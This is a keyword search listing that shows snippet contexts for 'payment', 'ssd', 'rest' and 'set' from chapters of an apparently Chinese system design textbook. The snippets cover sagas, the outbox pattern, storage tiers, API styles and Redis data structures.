  c28_b18.md: ...匹配的接口上。  **Q2.** Serverless（FaaS）与传统基于服务器的部署有何关键区别？以下用例你会选择 serverless，为什么？(a) S3 上传触发图片缩略图生成，(b) SocialSnap feed API 端点，(c) 夜间报表作...
  c28_b18.md: ...：** 关键区别：基于服务器：持久基础设施，为空闲时间付费，完全控制运行时，无冷启动，执行时长无限制，可维护有状态会话。Serverless：每次调用短暂，按执行付费，托管运行时，冷启动惩罚，最大执行 15 分钟（15 minutes），无状态。(a) 图片缩...
  c28_b18.md: ...，按执行付费，托管运行时，冷启动惩罚，最大执行 15 分钟（15 minutes），无状态。(a) 图片缩略图生成：**serverless 理想。** 事件驱动（S3 上传触发函数），执行时间短（每张图几秒），负载可变且突发（内容发布后上传聚集），无状态（每...
  c28_b18.md: ...2s）对必须 < 200ms 响应的端点是灾难性的。高且持续的请求量使按调用付费比预留容量更贵。Feed 服务还受益于 serverless 跨冷启动无法维护的进程内缓存。(c) 夜间报表作业：**serverless 理想。** 每天只运行一次，因此运行之间...
  c28_b18.md: ...费比预留容量更贵。Feed 服务还受益于 serverless 跨冷启动无法维护的进程内缓存。(c) 夜间报表作业：**serverless 理想。** 每天只运行一次，因此运行之间无空闲成本。执行时间可预测且短（假设报表生成快）。无延迟要求。事件驱动（定时触...
  c28_b24.md: ...文化决定团队如何从失败中学习。把失败视为系统问题而非个人问题的文化以复利速度积累学习，使每次事件后的系统更坚韧。  **Serverless** 和 **边缘计算** 代表抽象前沿：serverless 完全移除基础设施管理（代价是冷启动和执行限制）；边缘计算...
  c28_b24.md: ...文化以复利速度积累学习，使每次事件后的系统更坚韧。  **Serverless** 和 **边缘计算** 代表抽象前沿：serverless 完全移除基础设施管理（代价是冷启动和执行限制）；边缘计算把计算带到用户附近（代价是可访问资源有限）。两者都适用于特定用...
  c28_b24.md: ...文化决定团队如何从失败中学习。把失败视为系统问题而非个人问题的文化以复利速度积累学习，使每次事件后的系统更坚韧。  **Serverless** 和 **边缘计算** 代表抽象前沿：serverless 完全移除基础设施管理（代价是冷启动和执行限制）；边缘计算...
  c28_b24.md: ...文化以复利速度积累学习，使每次事件后的系统更坚韧。  **Serverless** 和 **边缘计算** 代表抽象前沿：serverless 完全移除基础设施管理（代价是冷启动和执行限制）；边缘计算把计算带到用户附近（代价是可访问资源有限）。两者都适用于特定用...

=== payment (35 occurrences) ===
  c02_b10.md: ...倍**。  **Step 3（第三步）：架构改动。**  把通知服务从同步结账路径移除。从：       User → Payment Service → Notification Service → "Order confirmed"   改成异步模式...
  c02_b10.md: ...fication Service → "Order confirmed"   改成异步模式：       User → Payment Service → (publish "order placed" event to queue) → "Order...
  c13_b03.md: ...威动作（Inverse Conway Maneuver）”，是设计你的组织以匹配你想要的架构。如果你想让 User 和 Payment 服务干净分离，就组建独立的团队并赋予独立所有权。架构会随之而来。...
  c13_b10.md: ...通知团队、用户资料团队——每个团队有自己的 Slack 频道、路线图和 on-call 轮值——他们产生的系统自然会有 Payment Service、Notification Service 和 User Service。这些团队主要通过定义好的接口（...
  c15_b01.md: ...on Service）。  每一步都触及不同服务，各有自己的数据库。两阶段提交（第 12 章）可以原子地协调它们——但 Payment Service 使用不参与 2PC 的第三方支付处理器。User Service 是 PostgreSQL 数据库。N...
  c15_b05.md: ...升级 saga 显式写出如下：  步骤 | 服务 | 正向操作 | 补偿事务 |---|---|---|--- 1 | Payment Service | 信用卡扣 9.99 USD | 退款 9.99 USD 2 | User Service | 设置...
  c15_b06.md: ...之间：  1. Checkout Handler 发布 `user.upgrade.initiated` 事件。 2. Payment Service 监听 `user.upgrade.initiated`，扣款，并发布 `payment.charge....
  c15_b06.md: ...事件。 2. Payment Service 监听 `user.upgrade.initiated`，扣款，并发布 `payment.charge.succeeded`（或 `payment.charge.failed`）。 3. User Servi...
  c15_b06.md: ....succeeded`（或 `payment.charge.failed`）。 3. User Service 监听 `payment.charge.succeeded`，把用户更新为高级版，并发布 `user.upgraded.to.premium`。...
  c15_b06.md: ...mium`，发送邮件。  补偿：如果 User Service 失败并发布 `user.upgrade.failed`，Payment Service 监听 `user.upgrade.failed` 并发起退款。   #### 定义：编舞  **编舞（...
  c15_b06.md: ...**——协调 saga。编排器显式按顺序调用每个服务，接收结果，决定下一步做什么。  高级版升级编排器：  1. 调用 Payment Service：扣 9.99 USD。等待结果。 2. 若成功：调用 User Service：设置 `is_prem...
  c15_b07.md: ...需要构建、部署和运维的新服务。它可能成为瓶颈（所有 saga 协调都经过它）。它引入了对其他服务的了解——编排器“知道”Payment Service、User Service 和 Notification Service 的细节，造成耦合。   ###...
  c15_b07.md: ...。   ### 15.6 Outbox 模式——可靠事件发布  上面描述的 saga 模式依赖服务可靠发布事件。但考虑 Payment Service：       BEGIN;         INSERT INTO payments (user_id...
  c15_b07.md: ...amount, ...) VALUES (42, 9.99, ...);         -- commit the payment record to the database     COMMIT;     // Publish event to...
  c15_b07.md: ...atabase     COMMIT;     // Publish event to message queue: "payment.charge.succeeded"   数据库提交与事件发布之间存在空隙。如果服务在此间隙崩溃，支付记录已保存但事件从...
  c15_b07.md: ...下一步永远不运行。  另一种顺序：       // Publish event to message queue: "payment.charge.succeeded"     BEGIN;         INSERT INTO payments (...
  c15_b07.md: ...需要构建、部署和运维的新服务。它可能成为瓶颈（所有 saga 协调都经过它）。它引入了对其他服务的了解——编排器“知道”Payment Service、User Service 和 Notification Service 的细节，造成耦合。   ###...
  c15_b07.md: ...。   ### 15.6 Outbox 模式——可靠事件发布  上面描述的 saga 模式依赖服务可靠发布事件。但考虑 Payment Service：       BEGIN;         INSERT INTO payments (user_id...
  c15_b07.md: ...amount, ...) VALUES (42, 9.99, ...);         -- commit the payment record to the database     COMMIT;     // Publish event to...
  c15_b07.md: ...atabase     COMMIT;     // Publish event to message queue: "payment.charge.succeeded"   数据库提交与事件发布之间存在空隙。如果服务在此间隙崩溃，支付记录已保存但事件从...
  c15_b07.md: ...下一步永远不运行。  另一种顺序：       // Publish event to message queue: "payment.charge.succeeded"     BEGIN;         INSERT INTO payments (...
  c15_b09.md: ...第 2 步：** 消息中继发布 outbox 事件。升级编排器收到事件并开始协调。  **第 3 步：** 编排器调用 Payment Service：“给用户 42 扣 9.99 USD，幂等键 `saga_7f3a9b2c_charge`。”  **...
  c15_b09.md: ...“给用户 42 扣 9.99 USD，幂等键 `saga_7f3a9b2c_charge`。”  **第 4 步：** Payment Service 检查 `saga_7f3a9b2c_charge` 是否处理过。没有。它扣款，把结果记录在 `proc...
  c15_b09.md: ...处理过。没有。它扣款，把结果记录在 `processed_operations` 表，并向自己的 outbox 写入 `payment.charge.succeeded` 事件。它自己的消息中继发布该事件。  **第 5 步：** 编排器收到 `paym...
  c15_b09.md: ...ment.charge.succeeded` 事件。它自己的消息中继发布该事件。  **第 5 步：** 编排器收到 `payment.charge.succeeded`。更新 saga 记录状态为 `PAYMENT_COMPLETE`。调用 User...
  c15_b13.md: ...**幸福路径：**  1. 开始：设置 `current_step = PAYMENT_PENDING`。用幂等键调用 Payment Service。等待（超时 30 秒）。 2. 支付成功：设置 `current_step = USER_PENDIN...
  c15_b13.md: ...`current_step = COMPLETE`。返回成功给轮询客户端。  **失败场景 (a)：支付扣款失败。** Payment Service 返回错误（无效卡、余额不足等）。编排器记录 `current_step = FAILED`。无需补偿—...
  c15_b13.md: ...。编排器以指数退避重试最多 5 次。如果全部失败，转入 `current_step = COMPENSATING`。向 Payment Service 发起退款（幂等键 `saga_7f3a9b2c_refund`）以补偿扣款。记录 `current_s...
  c15_b13.md: ...**幸福路径：**  1. 开始：设置 `current_step = PAYMENT_PENDING`。用幂等键调用 Payment Service。等待（超时 30 秒）。 2. 支付成功：设置 `current_step = USER_PENDIN...
  c15_b13.md: ...`current_step = COMPLETE`。返回成功给轮询客户端。  **失败场景 (a)：支付扣款失败。** Payment Service 返回错误（无效卡、余额不足等）。编排器记录 `current_step = FAILED`。无需补偿—...
  c15_b13.md: ...。编排器以指数退避重试最多 5 次。如果全部失败，转入 `current_step = COMPENSATING`。向 Payment Service 发起退款（幂等键 `saga_7f3a9b2c_refund`）以补偿扣款。记录 `current_s...
  c15_b13.md: ...**幸福路径：**  1. 开始：设置 `current_step = PAYMENT_PENDING`。用幂等键调用 Payment Service。等待（超时 30 秒）。 2. 支付成功：设置 `current_step = USER_PENDIN...
  c15_b13.md: ...`current_step = COMPLETE`。返回成功给轮询客户端。  **失败场景 (a)：支付扣款失败。** Payment Service 返回错误（无效卡、余额不足等）。编排器记录 `current_step = FAILED`。无需补偿—...
  c15_b13.md: ...。编排器以指数退避重试最多 5 次。如果全部失败，转入 `current_step = COMPENSATING`。向 Payment Service 发起退款（幂等键 `saga_7f3a9b2c_refund`）以补偿扣款。记录 `current_s...
  c15_b15.md: ...* 怀疑者指出了一个真实张力。一个知道其他五个服务 API、数据模型和失败模式的 saga 编排器确实与它们耦合。如果 Payment Service API 改变，编排器也要改。编排器不能独立于它编排的服务部署。  然而，这个争论混淆了两种不同类型的耦...

=== ssd (34 occurrences) ===
  c03_b01.md: ...| 3 μs | 快，但不是免费 | | 从 RAM 顺序读 1MB | 10 μs | RAM 顺序读取很快 | | SSD 随机读 | 150 μs | SSD 快，但不如 RAM | | 从 SSD 顺序读 1MB | 1 ms | 顺序读...
  c03_b01.md: ...| 从 RAM 顺序读 1MB | 10 μs | RAM 顺序读取很快 | | SSD 随机读 | 150 μs | SSD 快，但不如 RAM | | 从 SSD 顺序读 1MB | 1 ms | 顺序读取远快于随机读 | | HDD 寻道...
  c03_b01.md: ...μs | RAM 顺序读取很快 | | SSD 随机读 | 150 μs | SSD 快，但不如 RAM | | 从 SSD 顺序读 1MB | 1 ms | 顺序读取远快于随机读 | | HDD 寻道 + 读取 | 10 ms | HDD 寻...
  c03_b01.md: ...返 | 150 ms | 物理限制了跨洲速度 | | 从 HDD 顺序读 1MB | 20 ms | HDD 顺序读比 SSD 慢约 20 倍 |  花点时间感受这些数字的量级。RAM 比 SSD 快 100 倍。SSD 随机读比 HDD 快 1...
  c03_b01.md: ...读 1MB | 20 ms | HDD 顺序读比 SSD 慢约 20 倍 |  花点时间感受这些数字的量级。RAM 比 SSD 快 100 倍。SSD 随机读比 HDD 快 100 倍。跨洲网络往返比同一数据中心往返慢 300 倍。  这些比例在...
  c03_b01.md: ...s | HDD 顺序读比 SSD 慢约 20 倍 |  花点时间感受这些数字的量级。RAM 比 SSD 快 100 倍。SSD 随机读比 HDD 快 100 倍。跨洲网络往返比同一数据中心往返慢 300 倍。  这些比例在硬件代际间保持稳定（绝对...
  c03_b06.md: ...#### 概念检测  **Q1.** 不查表，估算 SSD 随机读与 RAM 访问的延迟比例。并解释这个差距在物理上为什么存在。  **答案：** SSD 随机读约 150 μs...
  c03_b06.md: ...1.** 不查表，估算 SSD 随机读与 RAM 访问的延迟比例。并解释这个差距在物理上为什么存在。  **答案：** SSD 随机读约 150 μs；RAM 访问约 100 ns。比例是 150,000 ns / 100 ns = 1500 倍...
  c03_b06.md: ...100 ns = 1500 倍。  这个差距存在是因为 RAM 是**电子的**——晶体管以电子速度开关，没有机械延迟。SSD 也是电子的，但数据存储在 NAND 闪存单元中，读取需要对单元加电压、感应电荷、再解码结果。闪存单元还有内部地址转换层...
  c03_b10.md: ...信息，就能做出好的架构决策。  工具：  * **延迟数字：** 知道 L1 缓存（1 ns）、RAM（100 ns）、SSD（150 μs）、HDD（10 ms）和网络（0.5–150 ms）的数量级。这些是你这个世界的速度极限。 * **2...
  c10_b02.md: ...这不是定价怪癖——它反映真实物理。  在电路中移动电子（内存或 CPU 缓存）比在旋转磁盘上移动磁头快。没有移动部件的 SSD 比旋转硬盘快，但比 DRAM 慢。速度层级对应成本层级。  这是从最快最贵到最慢最便宜的存储层级：  **第 1 级：...
  c10_b02.md: ...存放内容：工作数据、活跃数据库缓冲池、缓存（Redis、Memcached）、进行中的计算  **第 3 级：NVMe SSD**  * 速度：约 100 微秒（0.1 毫秒） * 成本：约 0.10–0.30 USD/GB * 容量：每块磁盘...
  c10_b02.md: ...0.30 USD/GB * 容量：每块磁盘 TB * 存放内容：主数据库存储、活跃应用文件  **第 4 级：SATA SSD**  * 速度：约 0.5 毫秒 * 成本：约 0.05–0.10 USD/GB * 容量：每块磁盘 TB * 存放内...
  c10_b02.md: ...是在这个 tradeoff（权衡）中航行。   #### 10,000 倍差距  需要记住的一个数字：DRAM 访问与 SSD 访问的差距约为 1,000 倍。DRAM 访问与 HDD 访问的差距约为 100,000 倍。Redis 以微秒级服务...
  c10_b03.md: ...原始磁盘。没有任何结构强加——这是上层系统的工作。  **你在哪里遇到块存储：**  * 服务器中的物理磁盘（SATA SSD、NVMe SSD、HDD） * 云块存储卷：Amazon EBS（Elastic Block Store）、Googl...
  c10_b03.md: ...结构强加——这是上层系统的工作。  **你在哪里遇到块存储：**  * 服务器中的物理磁盘（SATA SSD、NVMe SSD、HDD） * 云块存储卷：Amazon EBS（Elastic Block Store）、Google Cloud P...
  c10_b03.md: ...eSQL 写入 B-tree 索引更新（第 5 章）时，它是在向块设备写特定块。PostgreSQL 下面的 NVMe SSD 就是块存储。这就是为数据库性能选择正确磁盘类型的原因。   ### 10.3 文件存储——熟悉的抽象  **文件存储*...
  c10_b04.md: ...alSnap 用户上传 50 次头像照片（每次 2 MB），每月存储成本约 0.002 USD。经济学与把同样数据存在 SSD 数据库中根本不同。...
  c10_b10.md: ...**第 5 步：成本约束是什么？**  * 100 GB 热用户数据 → DRAM（500 USD/月）vs NVMe SSD（10 USD/月）vs 对象存储（2 USD/月） * 1 PB 冷归档数据 → HDD（40,000 USD/月）v...
  c10_b10.md: ...M (Redis) | ↓↓ 亚毫秒 | varies | ↑（如复制） | ↑（Redis 集群运维）   NVMe SSD (DB) | ↓ 个位数毫秒 | ↑（ACID） | ↑（RAID/副本） | ↑（DB 运维）   对象存储 | ↑...
  c10_b10.md: ...衡）：更快存储每字节更贵。了解这个 tradeoff（权衡）后，你可以设计分层存储架构——热数据放 DRAM，温数据放 SSD，冷数据放对象存储，归档数据放磁带/Glacier。需要足够快的数据就足够贵；可以慢的数据就便宜。   ### 10.1...
  c10_b11.md: ...）。平台可能存储 PB 级视频。按 0.023 USD/GB/月 计，存 1 PB 每月 23,000 USD——只有 SSD 成本的零头（100,000+ USD/月）。  访问模式：按 URL key 顺序读取大二进制对象。延迟要求：几十到几...
  c10_b11.md: ...L key 顺序读取大二进制对象。延迟要求：几十到几百毫秒可接受。成本：PB 级唯一经济可承受的分层。  **NVMe SSD 关系型数据库：**  最佳工作负载：电商订单管理。订单包含结构化数据（客户 ID、商品、价格、送货地址、状态）。需要复...
  c10_b12.md: ...000 倍，而且无法在数据库所需的原子性和体积下执行。  对象存储的延迟（每次操作约 50-100ms）也比 NVMe SSD 访问（约 0.1ms）高 10-100 倍，使其根本不适合活跃数据库每秒数千次 I/O 操作的需求。  **Q3.**...
  c10_b17.md: ...#### 深入思考  **Q1.** 存储层级显示，内存比 SSD 快约 1,000 倍，SSD 比对象存储快约 100-1000 倍。但对象存储被描述为“高持久性”（十一个 9）。为什...
  c10_b17.md: ...#### 深入思考  **Q1.** 存储层级显示，内存比 SSD 快约 1,000 倍，SSD 比对象存储快约 100-1000 倍。但对象存储被描述为“高持久性”（十一个 9）。为什么分布式、基于网络的对象存储同...
  c10_b17.md: ...往返约 1ms，远程可用区（availability zone，即可用性区域）往返 10-50ms。  本地 NVMe SSD 快正因为它不分布：一次写入到一个位置（一个 PCIe 总线上的物理设备）。没有网络，没有复制开销。但它的持久性有限：如...
  c10_b17.md: ...因为它不分布：一次写入到一个位置（一个 PCIe 总线上的物理设备）。没有网络，没有复制开销。但它的持久性有限：如果该 SSD 故障，数据就没了（除非有单独复制层）。生产环境中的本地 SSD 通常配有一种复制机制（RAID 或数据库复制如 Pos...
  c10_b17.md: ...备）。没有网络，没有复制开销。但它的持久性有限：如果该 SSD 故障，数据就没了（除非有单独复制层）。生产环境中的本地 SSD 通常配有一种复制机制（RAID 或数据库复制如 PostgreSQL streaming replication）——...
  c10_b17.md: ...D 或数据库复制如 PostgreSQL streaming replication）——这又加回了分布式开销。给本地 SSD 加复制后，你以一些开销换回部分持久性。  更深洞察：**规模化持久性需要多个独立副本；多个独立副本需要分布；分布需要网...
  c10_b19.md: ...级，反映了一个基本物理约束：速度和成本成反比。  **块存储**是基础——操作系统和数据库以低延迟访问原始块。NVMe SSD 代表了当前块存储性能的顶峰。  **文件存储**添加分层目录结构和多客户端访问。它是共享配置和日志文件的正确选择，但不...
  c20_b02.md: ...≈ **91 TB**  91 TB 相当可观，但完全可管理。现代数据库集群可以处理。数据可放在几百个带复制的高密度 SSD 节点上。  **带宽估算：**  * 读：每次重定向响应是带 `Location` header 的 301/302...
  c21_b06.md: ...00，即 5 PM 到 9 PM，假设 4 倍流量）：约 4,600 条/秒。调优良好的 PostgreSQL 主库配 SSD 可维持约 10,000 次写入/秒——当前规模单数据库主库足够。  但消息有天然分区结构：同一对话内的消息总是一起查询...
  c28_b11.md: ...迟 | N/A | 保护服务可用性 | 中 **Block storage (SSD/HDD)** (Ch 10) | SSD 低，HDD 中 | 持久 | 中 | 低 **Object storage (S3)** (Ch 10) | 中（网络...

=== rest (34 occurrences) ===
  c09_b07.md: ...。扩展 WebSocket 服务器需要仔细的会话管理（与第 11 章将探讨的有状态会话问题类似）。   ### 9.7 REST、GraphQL 与 gRPC——API 设计问题  当两个服务通信时，它们需要约定接口：有哪些操作、用什么数据格式、如...
  c09_b07.md: ...PI（Application Programming Interface）**。  三种 API 风格主导现代系统设计：REST、GraphQL 和 gRPC。选择它们需要第 6 章侦探方法：从访问模式线索推理。...
  c09_b08.md: ...#### REST——Representational State Transfer  REST 是公共 Web API 的主流风格。它用...
  c09_b08.md: ...#### REST——Representational State Transfer  REST 是公共 Web API 的主流风格。它用 HTTP 动词（GET、POST、PUT、DELETE、PATCH）对由 U...
  c09_b08.md: ...2/posts/101       → delete post 101 by user 42   响应通常是 JSON。REST 是无状态的：每个请求包含处理它所需的全部信息。  **REST 的优点：**  * 通用易懂——每个 HTTP 客户端...
  c09_b08.md: ...101 by user 42   响应通常是 JSON。REST 是无状态的：每个请求包含处理它所需的全部信息。  **REST 的优点：**  * 通用易懂——每个 HTTP 客户端都能消费 REST API，无需特殊工具 * 人类可读（URL...
  c09_b08.md: ...的：每个请求包含处理它所需的全部信息。  **REST 的优点：**  * 通用易懂——每个 HTTP 客户端都能消费 REST API，无需特殊工具 * 人类可读（URL 描述性强，JSON 可检查） * 可缓存——GET 请求可在任何层缓存（C...
  c09_b08.md: ...检查） * 可缓存——GET 请求可在任何层缓存（CDN、浏览器、代理） * 适合外部开发者会消费的公共 API  **REST 的缺点：**  **过度取回（Over-fetching）：** REST 端点返回完整资源。如果你只需要用户名和头像...
  c09_b08.md: ...适合外部开发者会消费的公共 API  **REST 的缺点：**  **过度取回（Over-fetching）：** REST 端点返回完整资源。如果你只需要用户名和头像 URL，`GET /users/42` 会返回所有字段（简介、邮箱、粉丝数...
  c09_b08.md: ...GraphQL——以查询作为 API  GraphQL 由 Facebook 开发，2015 年公开发布，专门用于解决 REST 的过度取回和取回不足问题。  在 GraphQL 中，客户端在查询中精确指定想要什么数据：       query {...
  c09_b08.md: ...可能成为安全问题（客户端可构造深嵌套查询，产生巨大数据库负载） * 给服务器增加 GraphQL 运行时层 * 对习惯 REST 的 API 消费者学习曲线更陡  **何时选 GraphQL：** 当许多不同客户端（Web、移动、第三方开发者）需要...
  c09_b09.md: ...性能重要且两端都由你控制。在微服务架构中，用户服务、帖子服务、通知服务每秒互相调用数千次——gRPC 在如此体量下相对 REST 的性能优势显著。   #### 侦探的选择——读取 API 线索  回想第 3 章线索 C（侦探的纪律）。API 风格...
  c09_b09.md: ...C（侦探的纪律）。API 风格选择直接取决于读取访问模式线索：  **线索：外部 API，由第三方开发者消费** → REST。它通用、文档完善、与 HTTP 工具友好。  **线索：许多不同客户端（Web、iOS、Android、智能电视）需要...
  c09_b09.md: ...高频调用** → gRPC。性能和强类型值得设置成本。  **线索：简单 CRUD 操作，API 表面小且稳定** → REST。GraphQL 的复杂度不合理。  **线索：实时双向通信** → WebSocket（标准 REST、GraphQL...
  c09_b09.md: ...et（标准 REST、GraphQL、gRPC 形式都不是，尽管 gRPC 流是一个选项）。  大多数生产系统使用多种：REST 供公共消费者，gRPC 供内部服务，WebSocket 供实时功能。   ### 9.8 API 网关与限流  随着...
  c09_b10.md: ...搜索服务。（在微服务架构中，API 网关是路由到多个后端服务的单一入口。）  **协议转换：** 接受来自移动客户端的 REST 请求，并转译为后端服务的 gRPC 请求。  **日志与可观测性：** 记录每个请求的耗时、状态码和客户端身份。...
  c09_b11.md: ...↑ 轻微（每请求 +1-5ms） | ↔ | ↑（集中式滥用防护） | ↑（额外组件、配置）   用 gRPC 替代 REST | ↓ 降低（消息小 3-10 倍、解析更快） | ↔ | ↔ | ↑（Protobuf schema 管理、工具）...
  c09_b11.md: ...0 倍、解析更快） | ↔ | ↔ | ↑（Protobuf schema 管理、工具）   用 GraphQL 替代 REST | ↑ 轻微（resolver 开销） | ↔ | ↔ | ↑（schema 设计、查询复杂度管理）    注意，负载...
  c09_b14.md: ...#### 应用问题  **Q1.** SocialSnap 考虑把移动 API 从 REST 换成 GraphQL。移动应用现在渲染 home feed 需要 4 个 REST 调用：`GET /users/{i...
  c09_b14.md: ...lSnap 考虑把移动 API 从 REST 换成 GraphQL。移动应用现在渲染 home feed 需要 4 个 REST 调用：`GET /users/{id}`、`GET /feed`、`GET /users/{id}/following...
  c09_b14.md: ...收益，需要接受什么成本？  提示  想想移动应用目前需要多少次往返。然后想想 GraphQL 的单一端点模型会改变什么。REST 和 GraphQL 的缓存分别是什么样的？服务器端实现成本如何？  **答案：**  **应用侦探框架：**  **支...
  c09_b14.md: ...答案：**  **应用侦探框架：**  **支持 GraphQL 的线索：**  移动应用渲染一个屏幕需要 4 个独立 REST 调用。每次调用在移动网络上都是一次独立往返（每个约 50-100ms）。串行请求时 home feed 可渲染前的总时...
  c09_b14.md: ...。移动带宽因消除过度取回字段和额外请求开销而节省。  **反对 GraphQL 的线索（或需要小心处理）：**  缓存：REST 的 `GET /feed` 可在 CDN 或浏览器层缓存（HTTP 层缓存）。GraphQL 查询是带自定义 quer...
  c09_b14.md: ...Client 的规范化缓存），要么在服务器 resolver 层（用 Redis，见第 7 章）。  服务器端复杂度：REST 端点是简单的数据库查询。GraphQL 服务器需要 schema 定义、每个字段的 resolver，以及防止深嵌套查...
  c09_b19.md: ...et** 为实时应用实现全双工服务器推送，代价是有状态的连接，使水平扩展复杂化（第 11 章直接处理这个问题）。  **REST、GraphQL 和 gRPC** 是三种各有 tradeoff（权衡）的 API 风格。REST 通用、可缓存。Gra...
  c09_b19.md: ...理这个问题）。  **REST、GraphQL 和 gRPC** 是三种各有 tradeoff（权衡）的 API 风格。REST 通用、可缓存。GraphQL 消除过度取回和取回不足。gRPC 是服务间通信的最高性能选择。访问模式线索指导选择。...
  c13_b05.md: ...向服务 B 发出请求并等待响应后才能继续。这模拟了单体中熟悉的函数调用模型，只是通过网络。  两种主流协议是 HTTP/REST（服务 A 向服务 B 的 URL 发送 HTTP 请求）和 gRPC（服务 A 调用由共享契约定义生成的函数，用 Pr...
  c13_b05.md: ...SON 更紧凑），提供强契约（`.proto` 文件定义接口，客户端和服务器生成代码确保一致），并支持双向流。HTTP/REST 更简单、支持更广泛（任何 HTTP 客户端都能调用 REST API，无需特殊工具）。  同步通信的关键特性：**服务...
  c13_b05.md: ...客户端和服务器生成代码确保一致），并支持双向流。HTTP/REST 更简单、支持更广泛（任何 HTTP 客户端都能调用 REST API，无需特殊工具）。  同步通信的关键特性：**服务 A 的可用性依赖于服务 B 的可用性。** 如果服务 B 宕...
  c13_b13.md: ....** gRPC 使用 Protocol Buffers（protocol buffer 协议，二进制序列化格式），而 REST 使用 JSON（文本格式）。一位同事说：“JSON 就行——计算机够快，序列化开销不重要。”评估这个说法。序列化格式在...
  c13_b13.md: ...影响带宽和反序列化时间。  **流场景：** gRPC 支持单条 HTTP/2 连接上的双向流。HTTP/1.1 上的 REST 每次请求需要新连接。对实时 feed 或实时更新，REST 的连接开销显著。...
  c13_b13.md: ...单条 HTTP/2 连接上的双向流。HTTP/1.1 上的 REST 每次请求需要新连接。对实时 feed 或实时更新，REST 的连接开销显著。...
  c13_b14.md: ....proto` 文件是客户端和服务器共享的机器可读契约。两边生成的代码确保它们在字段名、类型和结构上一致。用 JSON REST API 时，客户端和服务器很容易悄悄分叉（服务器重命名字段，客户端仍发旧名，被静默忽略）。Protocol Buffe...
  c28_b11.md: ...balancer)** (Ch 9) | 无延迟开销；缓存亲和收益 | N/A | 高（变更时最小重映射） | 中 **REST API** (Ch 9) | 中（HTTP 开销） | 无状态——无共享状态 | 高——无状态扩展 | 低 **gRP...

=== set (32 occurrences) ===
  c05_b11.md: ...es (user_id, post_id) VALUES (456, 12345);     UPDATE posts SET like_count = like_count + 1 WHERE id = 12345;     COMMIT;...
  c05_b13.md: ...(follower_id, followed_id) VALUES (1, 2);     UPDATE users SET follower_count = follower_count + 1 WHERE id = 2;     UPDAT...
  c05_b13.md: ...r_count = follower_count + 1 WHERE id = 2;     UPDATE users SET following_count = following_count + 1 WHERE id = 1;     COM...
  c06_b03.md: ...y 映射到一个 value。value 是不透明的——数据库存储它而不理解其结构。你通过 key 取回它。       SET user:1:session_token "abc123xyz"     GET user:1:session_tok...
  c06_b03.md: ..."abc123xyz"     GET user:1:session_token → "abc123xyz"      SET post:101:like_count 14322     INCR post:101:like_count → 14...
  c06_b03.md: ...浏览数和限流（“用户 X 这分钟已调用 47 次 API”）。  **实时数据：** 排行榜（Redis sorted set）、pub-sub 消息、实时在线状态（“谁现在在线”）。   #### 键值存储的 Tradeoffs（权衡）  **...
  c11_b13.md: ...* FROM users WHERE id = %s", [user_id])         local_cache.set(cache_key, profile, ttl=300)         return profile   找出在三台...
  c12_b07.md: ...r_id, amount, ...) VALUES (42, 9.99, ...);     UPDATE users SET is_premium = TRUE WHERE user_id = 42;     COMMIT;   如果任一操作失...
  c12_b11.md: ...两个地方：users 表和每条 post 行。  **答案：** 伪代码：       1. UPDATE users SET username = 'new_name' WHERE user_id = 42;  // 在用户所在 shard...
  c12_b11.md: ...在用户所在 shard     2. 对每个 shard (0..7):          UPDATE posts SET author_username = 'new_name' WHERE user_id = 42;     3. 使 R...
  c14_b07.md: ...p 帖子的点赞数可以是 G-Counter——任何服务器都可以本地记录一次点赞递增，最终通过合并计算总数。  **OR-Set（Observed-Remove Set）：** 一种同时支持 add 和 remove 的集合，设计上让并发 add...
  c14_b07.md: ...r——任何服务器都可以本地记录一次点赞递增，最终通过合并计算总数。  **OR-Set（Observed-Remove Set）：** 一种同时支持 add 和 remove 的集合，设计上让并发 add 和 remove 操作能确定性地解决。两...
  c17_b06.md: ...WHERE id IN (...) (102ms)           [202ms - 235ms] Redis: set cached_feed (33ms)   这一条追踪讲述了指标无法讲述的故事：总请求耗时 245ms，大部分（148m...
  c20_b11.md: ...有）：批量事件写入数据仓库（用于历史查询，5 分钟延迟） * 消费者 2（新增）：把事件写入 Redis sorted set 或时序数据库（如 InfluxDB 或 Redis TimeSeries），滚动 5 分钟窗口  **实时仪表盘：**...
  c20_b11.md: ...clicks` Kafka 消费者（消费者 2）按 `short_code` 为键把事件写入 Redis sorted set，score 为时间戳，member 为点击事件。要获取最近 5 分钟点击：`ZRANGEBYSCORE url:abc...
  c22_b04.md: ...Timeline 作为有序列表  Timeline 是按排序分数排序的帖子 ID 有序列表。Redis sorted set 非常合适：`user:F:timeline` 是一个 sorted set，每个 member 是 `post_id`...
  c22_b04.md: ...ID 有序列表。Redis sorted set 非常合适：`user:F:timeline` 是一个 sorted set，每个 member 是 `post_id`，score 是排序分数。Feed 获取即 `ZREVRANGEBYSCOR...
  c22_b04.md: ...—— 分数最高的 20 条帖子。  写时扇出：用户 U 发帖 P 时，系统把 P 加入每个关注者 F 的 sorted set：`ZADD user:F:timeline <ranking_score> <post_id>`。插入后，若 sort...
  c22_b04.md: ...ADD user:F:timeline <ranking_score> <post_id>`。插入后，若 sorted set 超过最大大小（如 5000 条），删除最低分条目：`ZREMRANGEBYRANK user:F:timeline 0...
  c23_b02.md: ...我们的爬虫会再次把 Wikipedia 加入队列并爬第二次——然后无限循环。队列变成无限。  解决方案是 **seen set** —— 所有已访问 URL 的集合。入队前检查 URL 是否在 seen set 中。如果是，跳过。      if...
  c23_b02.md: ...无限。  解决方案是 **seen set** —— 所有已访问 URL 的集合。入队前检查 URL 是否在 seen set 中。如果是，跳过。      if url not in seen_set:         queue.enqueu...
  c23_b02.md: ...url)         seen_set.add(url)  100 亿（10 billion）URL 时，seen set 是 100 亿 URL 字符串。精确存入内存不可行（每个 URL 约 100 字节；100 亿 × 100 字节 =...
  c23_b02.md: ...0 亿 URL 字符串。精确存入内存不可行（每个 URL 约 100 字节；100 亿 × 100 字节 = seen set 单独 1 TB 内存）。实用方案是 **Bloom filter** —— 一种概率数据结构，以极高确定性回答“我见过...
  c23_b09.md: ...多，因为即使对常见词，posting list 也只是所有文档的极小一部分。  **Q4.** 为什么爬虫的 seen-set 需要 Bloom filter 而不是标准 hash set？  **答案：** 标准 hash set 把每个 UR...
  c23_b09.md: ...的极小一部分。  **Q4.** 为什么爬虫的 seen-set 需要 Bloom filter 而不是标准 hash set？  **答案：** 标准 hash set 把每个 URL 存为完整字符串。100 亿（10 billion）URL...
  c23_b09.md: ...的 seen-set 需要 Bloom filter 而不是标准 hash set？  **答案：** 标准 hash set 把每个 URL 存为完整字符串。100 亿（10 billion）URL 平均 100 字节，精确 seen-set...
